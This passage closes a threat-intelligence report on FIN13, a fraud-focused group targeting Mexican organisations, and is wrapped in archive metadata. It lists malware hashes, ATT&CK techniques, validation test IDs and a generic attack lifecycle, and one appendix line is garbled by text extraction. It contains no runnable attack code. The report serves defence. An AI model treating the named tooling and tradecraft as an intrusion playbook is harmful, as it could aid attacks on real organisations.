transactions.\n\nThe GASCAN sample was tailored to the victim environment and expected data from POS systems used by the organization. The same victim\nwas alerted of over one thousand fraudulent transactions in a short time window, totaling millions of pesos, or several hundred thousand U.S.\ndollars.\n\n## Outlook\n\n[Between the complex web of cybercriminal activity, traditional organized crime turning to cryptocurrency,](https://www.reuters.com/article/mexico-bitcoin/insight-latin-american-crime-cartels-turn-to-crypto-to-clean-up-their-cash-idUSL1N2IJ01D) [aggressive targeting by North Korea,](https://www.fifthdomain.com/critical-infrastructure/2018/06/29/north-korea-hacking-the-hell-out-of-latin-america/)\n[Chinese espionage, and the](https://www.mandiant.com/resources/top-cyber-threats-to-latin-america-and-the-caribbean) [ransomware pandemic, Latin American cyberspace will continue to be an area for additional research for years to](https://advantage.mandiant.com/reports/21-00009094)\ncome as noted by [Proofpoint and](https://www.proofpoint.com/us/blog/threat-insight/new-threat-actor-uses-spanish-language-lures-distribute-seldom-observed-bandook) [ESET publications earlier this year.](https://www.welivesecurity.com/2021/07/07/bandidos-at-large-spying-campaign-latin-america/)\n\nNotably, while ransomware has captured the cybercriminal zeitgeist, Mandiant has not observed FIN13 deploy ransomware in an intrusion at\nthe time of this publication. FIN13 has remained focused on more traditional financially motivated cybercrime and has targeted both Linux and\nWindows systems throughout their operations. It remains to be seen whether Latin American criminal actors will also transition to primarily\nexecuting ransomware operations or will continue to pursue fraud.\n\nLatin American security teams and executives should be aware of these threats, assess their current posture, and adapt accordingly. Mandiant\nencourages these organizations to continue to collaborate with the larger industry to mitigate these threats. Mandiant’s team of Incident\nResponse, [Strategic Readiness, and](https://www.mandiant.com/services/strategic-readiness) [Technical Assurance consultants in Mexico and around the globe are ready to assist with these efforts.](https://www.mandiant.com/services/technical-assurance)\n\n## More Information\n\nLearn more about FIN13 and SWEARJAR, a backdoor used by FIN13 that retrieves commands via DNS TXT records, by registering for a free\nsubscription to Mandiant Advantage Threat Intelligence.\n\n[Already registered? Read the FIN13 post, along with the SWEARJAR malware profile and](https://advantage.mandiant.com/reports/21-00025490) [additional reporting on the backdoor.](https://advantage.mandiant.com/reports/18-00010764)\n\n## Indicators of Compromise\n\n\n**MALWARE**\n**FAMILY**\n\n\n**MD5** **SHA1** **SHA256**\n\n\nCLOSEWATCH 1c871dba90faeef9cb637046be04f291 ea71757fcd45425353d4c432f8fcef4451cd9b22 e9e25584475ebf08957886725e\n\nDRAWSTRING f774a1159ec25324c3686431aeb9a038 1f53342aaa71be3d25e6c28dd36f949b7b504a28 2d2a67fcce58c73e96358161e48\n\n\n-----\n\nDRAWSTRING 9a6993ee1af31dc386be4583dd866bfc 67c7469aaaf352705ec66c3bb73366c77cf3577c 77b4da7f513b7bf555e34fd6450\n\n\nInvokeSMBExec\n\nInvokeWMIExec\n\n\n9e484e32505758a6d991c33652ad1b14 16a71f2ffc1bb24b2862295072831b698ae38f3a 674fc045dc198874f323ebdfb9e9\n\n081beadd4dc5f070c087df82df22179c ca0cc3d624be7a2933413e8d7440374b25eae1bd b41bd54bbf119d153e0878696cd\n\n\nGOBOT2 384fea272567d924c2a256ce9e91d949 0ae8dd21ce229884519cb8e5ed6b2753a18a7ead d961148e97857562b9cf06a0e2d\n\nHOTLANE b451fe96ab76cf676cf22a258fdb38ce 8c8ad56ec08a4b23e0593c3d578fd7e23dc45211 4b1b1fd688a5bf4e27a4e62a56b\n\nHOTLANE 94642e317bdbcc5d216aa730ae851a05 adca9b2d2e9e1c2cfbeb2f730894bf5ba54acad8 906b0e99850448a45ab3de4115\n\nJSPRAT ab2dbe55a54368e0ba4c9a4abe71b47b 7439a49cd10616a7c9d649120dfba7eca7f224b8 c7740484dba2eaac5f3455596df\n\nJSPRAT a4cff691eda32dc11a621d9731fcea73 75b58a5fef77886d697041cfab5c3d6beda21661 efce809b03fe30765837e99bdfa\n\nJSPRAT 8a8597d1bfa42229224c46e38ebed07b 5fc73458f617a7fb12d3c769ea07f5ec61e12153 ba5f9281ac9a9bc7c4684dd9660\n\nJSPRAT 34a8ac7dfc5ce7b4a1992abdb5e0fa15 12f6c27f400e85fb8f075ff7b17f475a383b4499 db3bda73338c164d523c0ab27e\n\nLATCHKEY 0b26021f37f01f00cc6cf880bd3d7f68 4ab56883ddcb3d3e9af22aa73898d5ca7d2250a6 b23621caf5323e2207d8fbf5bee\n\nMAILSLOT 5fe987a61b88e34102002a1f13cfee3d 28333822aab1eeebfb299c845b32a2fa17e7747d 5e59b103bccf5cad21dde116c71\n\nMIMIKATZ d7af79c4533e3050c47044e41c90e829 463a36c5fb8c8dffc659f9d1eb4509d8f62816e7 c1fb986e7f6fde354382d7b4646\n\nNIGHTJAR b130215dd140fa47d06f6e1d5ad8e941 28427a2778731b3b247edf6a576b8149e9784d28 fa6f93ef0bb35a9dad1a5e60105\n\nNIGHTJAR 86327a5429ca8c58685a310b98d1be95 e92c1a2f03f5895889313c8e8f4fea1aa6f24652 5ece301c0e0295b511f4def643b\n\nPORTHOLE f4b56e8b6c0710f1e8a18dc4f11a4edc 2e309fa21194a069feb02ff0cd9cafe06d84f94d 84ac021af9675763af11c955f294\n\nPORTHOLE 33c22962e43cef8627cbc63535f33fce 72906cec6bc424f8a9db5ca28ece2d2d2200dba2 61257b4ef15e20aa9407592e25\n\nPROCDUMP 42539491f0e4fe145b9ed7d002bcb9ae ddebbf15665986402e662947c071979329dd1a71 2f1520301536958bcf5c65516ca\n\nPROCDUMP a92669ec8852230a10256ac23bbf4489 4bed038c66e7fdbbfb0365669923a73fbc9bb8f4 16f413862efda3aba631d8a7ae2\n\nSIXPACK 863ead7a592b47d7547ab7931c935633 f7cc106b208a9c3e4d630627954489dd2b0d5bda a3676562571f48c269027a069e\n\nSPINOFF 9e0563caa00582c3aa4bf6c41d9f9c46 4716aeb3076a6b0fd00ec9f5144747270407dcc1 4029788b2cb65282f4264283a3\n\nSWEARJAR f50efee758de4aa18f0ce9459d5722f4 13dfe71b95d3932ca4e39b84e6ded5086abe2b60 1e675e32ebb61b6259b0df978e\n\nSWEARJAR 9340e6fc1d6d6b0379ab1583ccc2a0b1 b0caaf26e52168cb839f12ba499ff1602ce8191b 0463fa109106363b4c87c8909bf\n\nSWEARJAR 6488086b07a36a2842df5b5451b3640b dda98668eda22cf20897960fc8ffc964ae415582 2f23224937ac723f58e4036eaf1\n\nSWEARJAR 2e9ae2864d368ed1e6747ba28440ba5c 8bfd968026b4268ba7d205871e329717aec2def8 e76e0a692be03fdc5b12483b7e\n\nTINYSHELL 428b47caf74ce986bc3688262355d5b7 dadb1cc49fa8fa577bb6d09e15639ab54dd46c18 0dd4d924c9069992dd7b3e007c\n\nWMIEXEC dc78c63a267ef5f894e99aa1e6bfe888 75c728ec83c65348e51ef1e63915a2415886bc9f 0e141b51aa20f518a79185f8354\n\n\n-----\n\n## MITRE ATT&CK Techniques\n\nATT&CK Tactic Category Techniques\n\nResource Development: [Acquire Infrastructure (T1583)](https://attack.mitre.org/techniques/T1583)\n\n[Virtual Private Server (T1583.003)](https://attack.mitre.org/techniques/T1583/003)\n\n[Develop Capabilities (T1587)](https://attack.mitre.org/techniques/T1587)\n\n[Digital Certificates (T1587.003)](https://attack.mitre.org/techniques/T1587/003)\n\n[Obtain Capabilities (T1588)](https://attack.mitre.org/techniques/T1588)\n\n[Code Signing Certificate (T1588.003)](https://attack.mitre.org/techniques/T1588/003)\n\n[Stage Capabilities (T1608)](https://attack.mitre.org/techniques/T1608)\n\n[Install Digital Certificate (T1608.003)](https://attack.mitre.org/techniques/T1608/003)\n\nInitial Access: [Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190/)\n\nExecution: [Windows Management Instrumentation (T1047)](https://attack.mitre.org/techniques/T1047)\n\n[Scheduled Task/Job (T1053)](https://attack.mitre.org/techniques/T1053)\n\n[Scheduled Task (T1053.005)](https://attack.mitre.org/techniques/T1053/005)\n\n[Command and Scripting Interpreter (T1059)](https://attack.mitre.org/techniques/T1059)\n\n[PowerShell (T1059.001)](https://attack.mitre.org/techniques/T1059/001)\n[Windows Command Shell (T1059.003)](https://attack.mitre.org/techniques/T1059/003)\n[Visual Basic (T1059.005)](https://attack.mitre.org/techniques/T1059/005)\n[JavaScript (T1059.007)](https://attack.mitre.org/techniques/T1059/007)\n\n[Inter-Process Communication (T1559)](https://attack.mitre.org/techniques/T1559)\n\n[System Services (T1569)](https://attack.mitre.org/techniques/T1569)\n\n[Service Execution (T1569.002)](https://attack.mitre.org/techniques/T1569/002)\n\nPersistence: [Scheduled Task/Job (T1053)](https://attack.mitre.org/techniques/T1053)\n\n[Scheduled Task (T1053.005)](https://attack.mitre.org/techniques/T1053/005)\n\n[Create Account (T1136)](https://attack.mitre.org/techniques/T1136)\n\n[Server Software Component (T1505)](https://attack.mitre.org/techniques/T1505)\n\n[Web Shell (T1505.003)](https://attack.mitre.org/techniques/T1505/003)\n\n[Create or Modify System Process (T1543)](https://attack.mitre.org/techniques/T1543)\n\n[Windows Service (T1543.003)](https://attack.mitre.org/techniques/T1543/003)\n\n[Event Triggered Execution (T1546)](https://attack.mitre.org/techniques/T1546)\n\n[Netsh Helper DLL (T1546.007)](https://attack.mitre.org/techniques/T1546/007)\n\n[Boot or Logon Autostart Execution (T1547)](https://attack.mitre.org/techniques/T1547)\n\n[Registry Run Keys / Startup Folder (T1547.001)](https://attack.mitre.org/techniques/T1547/001)\n\nPrivilege Escalation: [Scheduled Task/Job (T1053)](https://attack.mitre.org/techniques/T1053)\n\n[Scheduled Task (T1053.005)](https://attack.mitre.org/techniques/T1053/005)\n\n[Process Injection (T1055)](https://attack.mitre.org/techniques/T1055)\n\n[Access Token Manipulation (T1134)](https://attack.mitre.org/techniques/T1134)\n\n[Boot or Logon Autostart Execution (T1547)](https://attack.mitre.org/techniques/T1547)\n\n[Registry Run Keys / Startup Folder (T1547.001)](https://attack.mitre.org/techniques/T1547/001)\n\n\n-----\n\nDefense Evasion: [Obfuscated Files or Information (T1027)](https://attack.mitre.org/techniques/T1027)\n\n[Software Packing (T1027.002)](https://attack.mitre.org/techniques/T1027/002)\n[Indicator Removal from Tools (T1027.005)](https://attack.mitre.org/techniques/T1027/005)\n\n[Process Injection (T1055)](https://attack.mitre.org/techniques/T1055)\n\n[Indicator Removal on Host (T1070)](https://attack.mitre.org/techniques/T1070)\n\n[File Deletion (T1070.004)](https://attack.mitre.org/techniques/T1070/004)\n\n[Modify Registry (T1112)](https://attack.mitre.org/techniques/T1112)\n\n[Access Token Manipulation (T1134)](https://attack.mitre.org/techniques/T1134)\n\n[Deobfuscate/Decode Files or Information (T1140)](https://attack.mitre.org/techniques/T1140)\n\n[Virtualization/Sandbox Evasion (T1497)](https://attack.mitre.org/techniques/T1497)\n\n[Use Alternate Authentication Material (T1550)](https://attack.mitre.org/techniques/T1550)\n\n[Pass the Hash (T1550.002)](https://attack.mitre.org/techniques/T1550/002)\n\n[Subvert Trust Controls (T1553)](https://attack.mitre.org/techniques/T1553)\n\n[Code Signing (T1553.002)](https://attack.mitre.org/techniques/T1553/002)\n\n[Impair Defenses (T1562)](https://attack.mitre.org/techniques/T1562)\n\n[Disable or Modify System Firewall (T1562.004)](https://attack.mitre.org/techniques/T1562/004)\n\n[Hide Artifacts (T1564)](https://attack.mitre.org/techniques/T1564)\n\n[Hidden Window (T1564.003)](https://attack.mitre.org/techniques/T1564/003)\n\n[Hijack Execution Flow (T1574)](https://attack.mitre.org/techniques/T1574)\n\n[Services Registry Permissions Weakness (T1574.011)](https://attack.mitre.org/techniques/T1574/011)\n\nCredential Access: [OS Credential Dumping (T1003)](https://attack.mitre.org/techniques/T1003)\n\n[LSASS Memory (T1003.001)](https://attack.mitre.org/techniques/T1003/001)\n\n[Network Sniffing (T1040)](https://attack.mitre.org/techniques/T1040)\n\n[Unsecured Credentials (T1552)](https://attack.mitre.org/techniques/T1552)\n\n\n-----\n\nDiscovery: [System Service Discovery (T1007)](https://attack.mitre.org/techniques/T1007)\n\n[Query Registry (T1012)](https://attack.mitre.org/techniques/T1012)\n\n[System Network Configuration Discovery (T1016)](https://attack.mitre.org/techniques/T1016)\n\n[Remote System Discovery (T1018)](https://attack.mitre.org/techniques/T1018)\n\n[System Owner/User Discovery (T1033)](https://attack.mitre.org/techniques/T1033)\n\n[Network Sniffing (T1040)](https://attack.mitre.org/techniques/T1040)\n\n[Network Service Scanning (T1046)](https://attack.mitre.org/techniques/T1046)\n\n[System Network Connections Discovery (T1049)](https://attack.mitre.org/techniques/T1049)\n\n[Process Discovery (T1057)](https://attack.mitre.org/techniques/T1057)\n\n[Permission Groups Discovery (T1069)](https://attack.mitre.org/techniques/T1069)\n\n[Local Groups (T1069.001)](https://attack.mitre.org/techniques/T1069/001)\n[Domain Groups (T1069.002)](https://attack.mitre.org/techniques/T1069/002)\n\n[System Information Discovery (T1082)](https://attack.mitre.org/techniques/T1082)\n\n[File and Directory Discovery (T1083)](https://attack.mitre.org/techniques/T1083)\n\n[Account Discovery (T1087)](https://attack.mitre.org/techniques/T1087)\n\n[Domain Account (T1087.002)](https://attack.mitre.org/techniques/T1087/002)\n\n[Network Share Discovery (T1135)](https://attack.mitre.org/techniques/T1135)\n\n[Virtualization/Sandbox Evasion (T1497)](https://attack.mitre.org/techniques/T1497)\n\n[Software Discovery (T1518)](https://attack.mitre.org/techniques/T1518)\n\n[Security Software Discovery (T1518.001)](https://attack.mitre.org/techniques/T1518/001)\n\nLateral Movement: [Remote Services (T1021)](https://attack.mitre.org/techniques/T1021)\n\n[Remote Desktop Protocol (T1021.001)](https://attack.mitre.org/techniques/T1021/001)\n[SMB/Windows Admin Shares (T1021.002)](https://attack.mitre.org/techniques/T1021/002)\n\n[Use Alternate Authentication Material (T1550)](https://attack.mitre.org/techniques/T1550)\n\n[Pass the Hash (T1550.002)](https://attack.mitre.org/techniques/T1550/002)\n\nCollection: [Data from Network Shared Drive (T1039)](https://attack.mitre.org/techniques/T1039)\n\n[Data Staged (T1074)](https://attack.mitre.org/techniques/T1074)\n\n[Local Data Staging (T1074.001)](https://attack.mitre.org/techniques/T1074/001)\n[Remote Data Staging (T1074.002)](https://attack.mitre.org/techniques/T1074/002)\n\n[Data from Information Repositories (T1213)](https://attack.mitre.org/techniques/T1213)\n\n[Archive Collected Data (T1560)](https://attack.mitre.org/techniques/T1560)\n\n[Archive via Utility (T1560.001)](https://attack.mitre.org/techniques/T1560/001)\n[Archive via Library (T1560.002)](https://attack.mitre.org/techniques/T1560/002)\n\n\n-----\n\nCommand and Control: [Proxy (T1090)](https://attack.mitre.org/techniques/T1090)\n\n[Application Layer Protocol (T1071)](https://attack.mitre.org/techniques/T1071)\n\n[Web Protocols (T1071.001)](https://attack.mitre.org/techniques/T1071/001)\n[Mail Protocols (T1071.003)](https://attack.mitre.org/techniques/T1071/003)\n[DNS (T1071.004)](https://attack.mitre.org/techniques/T1071/004)\n\n[Non-Application Layer Protocol (T1095)](https://attack.mitre.org/techniques/T1095)\n\n[Ingress Tool Transfer (T1105)](https://attack.mitre.org/techniques/T1105)\n\n[Data Encoding (T1132)](https://attack.mitre.org/techniques/T1132)\n\n[Standard Encoding (T1132.001)](https://attack.mitre.org/techniques/T1132/001)\n\n[Protocol Tunneling (T1572)](https://attack.mitre.org/techniques/T1572)\n\n[Encrypted Channel (T1573)](https://attack.mitre.org/techniques/T1573)\n\n[Asymmetric Cryptography (T1573.002)](https://attack.mitre.org/techniques/T1573/002)\n\nExfiltration: [Exfiltration Over Web Service (T1567)](https://attack.mitre.org/techniques/T1567)\n\nImpact: [Service Stop (T1489)](https://attack.mitre.org/techniques/T1489)\n\n[System Shutdown/Reboot (T1529)](https://attack.mitre.org/techniques/T1529)\n\n## Mandiant Security Validation Actions\n\n[Organizations can validate their security controls using the following Actions with Mandiant Security Validation.](https://www.mandiant.com/advantage/security-validation)\n\nVID Name\n\nA102-144 Command and Control - FIN13, DRAWSTRING, C2 Communication\n\nA104-905 Host CLI - FIN13, DRAWSTRING, Exclude From Scanning\n\nA104-906 Host CLI - FIN13, DRAWSTRING, Using netsh to Allow Communications\n\nA104-907 Host CLI - FIN13, Persistence Using Registry Keys\n\nA104-908 Host CLI - FIN13, Persistence Using Schedule Tasks\n\nA102-119 Malicious File Transfer - FIN13, CLOSEWATCH, Download, Variant #1\n\nA102-120 Malicious File Transfer - FIN13, DRAWSTRING, Download, Variant #1\n\nA102-121 Malicious File Transfer - FIN13, DRAWSTRING, Download, Variant #2\n\nA102-122 Malicious File Transfer - FIN13, GOBOT2, Download\n\nA102-123 Malicious File Transfer - FIN13, JSPRAT, Download, Variant #1\n\nA102-124 Malicious File Transfer - FIN13, JSPRAT, Download, Variant #2\n\nA102-125 Malicious File Transfer - FIN13, JSPRAT, Download, Variant #3\n\nA102-126 Malicious File Transfer - FIN13, JSPRAT, Download, Variant #4\n\nA102-127 Malicious File Transfer - FIN13, LATCHKEY, Download\n\n\n-----\n\nA102-128 Malicious File Transfer - FIN13, MAILSLOT, Download\n\nA102-129 Malicious File Transfer - FIN13, MIMIKATZ, Download\n\nA102-130 Malicious File Transfer - FIN13, NIGHTJAR, Download, Variant #1\n\nA102-131 Malicious File Transfer - FIN13, NIGHTJAR, Download, Variant #2\n\nA102-132 Malicious File Transfer - FIN13, PORTHOLE, Download, Variant #1\n\nA102-133 Malicious File Transfer - FIN13, PORTHOLE, Download, Variant #2\n\nA102-134 Malicious File Transfer - FIN13, SIXPACK, Download\n\nA102-135 Malicious File Transfer - FIN13, SPINOFF, Download\n\nA102-136 Malicious File Transfer - FIN13, SWEARJAR, Download, Variant #1\n\nA102-137 Malicious File Transfer - FIN13, SWEARJAR, Download, Variant #2\n\nA102-138 Malicious File Transfer - FIN13, SWEARJAR, Download, Variant #3\n\nA102-139 Malicious File Transfer - FIN13, SWEARJAR, Download, Variant #4\n\nA102-140 Malicious File Transfer - FIN13, TINYSHELL, Download\n\nA102-141 Malicious File Transfer - FIN13, WMIEXEC, Download\n\nA102-142 Malicious File Transfer - HOTLANE (UPX unpacked), Download\n\nA102-143 Malicious File Transfer - HOTLANE, Download, UPX Packed\n\nA104-909 Protected Theater - FIN13, GOBOT2, Execution\n\n## Acknowledgements\n\nThis blog post would not have been possible without the exceptional efforts from Mandiant Consulting’s Incident Response team, Managed\nDefense Analysts, FLARE’s outstanding Reverse Engineers, Detection Wizard Evan Reese, Jeremy Kennelly for his expertise, Mandiant\nThreat Intelligence’s collections team, and all those unsung Mandiant Engineers that keep the cogs greased and turning.\n\n## Appendix A: Targeted Attack Lifecycle\n\n**Initial Reconnaissance: The attacker researches systems and employees of a target and outlines a methodology for the intrusion. The**\nattacker may search for infrastructure that provides remote access to an environment or research employees to target for social engineering\nattacks.\n\n**Initial Compromise: The attacker successfully executes malicious code on one or more systems. This usually occurs as the result of a social**\nengineering attack or exploitation of a vulnerability on an Internet-facing system.\n\n\n-----\n\n**stab s** **oot o d** ed ate y o o g t e t a co p o se, t e attac e a ta s co t ued co t o o e a ece t y co p o sed\nsystem. The attacker typically establishes a foothold by installing a persistent backdoor or downloading additional utilities to the compromised\nsystem.\n\n**Escalate Privileges: The attacker obtains further access to systems and data within the environment. Attackers often escalate their privileges**\nthrough credential harvesting, keystroke logging, or subversion of authentication systems.\n\n**Internal Reconnaissance: The attacker explores the organization’s environment to gain a better understanding of infrastructure, storage of**\ninformation of interest, and the roles and responsibilities of key individuals.\n\n**Move Laterally: The attacker uses accounts obtained from the “Escalate Privileges” phase and moves laterally to additional systems within**\nthe compromised environment. Common lateral movement techniques include accessing network file shares, remote execution of commands,\nor accessing systems through remote login protocols such as Remote Desktop Services (RDS) or secure shell (SSH).\n\n**Maintain Presence: The attacker ensures continued access to the environment by installing multiple variants of backdoors or by accessing**\nremote access services such as the corporate virtual private network (VPN).\n\n**Complete Mission: The attacker accomplishes the objectives of the intrusion such as stealing intellectual property, financial data, mergers**\nand acquisition information, or personally identifiable information (PII). In other cases, the objective of the mission might be a disruption of\nsystems or services or destruction of data within the environment.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-07 - FIN13- A Cybercriminal Threat Actor Focused on Mexico.pdf"
    ],
    "report_names": [
        "2021-12-07 - FIN13- A Cybercriminal Threat Actor Focused on Mexico.pdf"
    ],
    "threat_actors": [
        {
            "id": "d134593b-1325-47ab-9bb7-b47d6473e352",
            "created_at": "2022-10-25T15:50:23.827908Z",
            "updated_at": "2025-03-27T02:00:55.554076Z",
            "deleted_at": null,
            "main_name": "FIN10",
            "aliases": [
                "FIN10"
            ],
            "source_name": "MITRE:FIN10",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "575d8adf-f451-4110-b1c0-89fb463e99c0",
            "created_at": "2022-10-25T16:07:23.637493Z",
            "updated_at": "2025-03-27T02:02:09.900204Z",
            "deleted_at": null,
            "main_name": "FIN13",
            "aliases": [],
            "source_name": "ETDA:FIN13",
            "tools": [
                "BLUEAGAVE",
                "BUSTEDPIPE",
                "CLOSEWATCH",
                "GetUserSPNS.vbs",
                "GoBot2",
                "HOTLANE",
                "JSPRAT",
                "MAILSLOT",
                "PowerSploit",
                "ProcDump",
                "SHELLSWEEP",
                "SIXPACK",
                "SPINOFF",
                "SWEARJAR",
                "Tiny SHell",
                "nmap",
                "tsh"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9e3a488e-d304-4431-92e0-c8b9c80542bf",
            "created_at": "2022-10-25T16:07:23.627198Z",
            "updated_at": "2025-03-27T02:02:09.895667Z",
            "deleted_at": null,
            "main_name": "FIN10",
            "aliases": [],
            "source_name": "ETDA:FIN10",
            "tools": [
                "EmPyre",
                "EmpireProject",
                "KOMPROGO",
                "PowerShell Empire",
                "Splinter RAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dcba8e2b-93e0-4d6e-a15f-5c44faebc3b1",
            "created_at": "2022-10-25T16:07:23.816991Z",
            "updated_at": "2025-03-27T02:02:09.991944Z",
            "deleted_at": null,
            "main_name": "Lurk",
            "aliases": [],
            "source_name": "ETDA:Lurk",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7aa1288a-61ec-4793-b543-9fedc26b9b03",
            "created_at": "2023-11-01T02:01:06.805323Z",
            "updated_at": "2025-03-27T02:00:55.555589Z",
            "deleted_at": null,
            "main_name": "FIN13",
            "aliases": [
                "FIN13",
                "Elephant Beetle"
            ],
            "source_name": "MITRE:FIN13",
            "tools": [
                "Impacket",
                "Mimikatz",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "277b5119-e193-4f98-b18a-c6db644f32f3",
            "created_at": "2023-01-06T13:46:38.971767Z",
            "updated_at": "2025-03-27T02:00:02.966286Z",
            "deleted_at": null,
            "main_name": "FIN10",
            "aliases": [
                "G0051"
            ],
            "source_name": "MISPGALAXY:FIN10",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f57e32ac-9f90-471d-93ba-7f6d8b05e6c1",
            "created_at": "2023-01-06T13:46:39.29882Z",
            "updated_at": "2025-03-27T02:00:03.044264Z",
            "deleted_at": null,
            "main_name": "FIN13",
            "aliases": [
                "TG2003",
                "Elephant Beetle"
            ],
            "source_name": "MISPGALAXY:FIN13",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535797,
    "ts_updated_at": 1743041820,
    "ts_creation_date": 1653774147,
    "ts_modification_date": 1653774147,
    "files": {
        "pdf": "https://archive.orkl.eu/601f1f46ba4b55040052e3037e7f7bf48b66fa6f.pdf",
        "text": "https://archive.orkl.eu/601f1f46ba4b55040052e3037e7f7bf48b66fa6f.txt",
        "img": "https://archive.orkl.eu/601f1f46ba4b55040052e3037e7f7bf48b66fa6f.jpg"
    }
}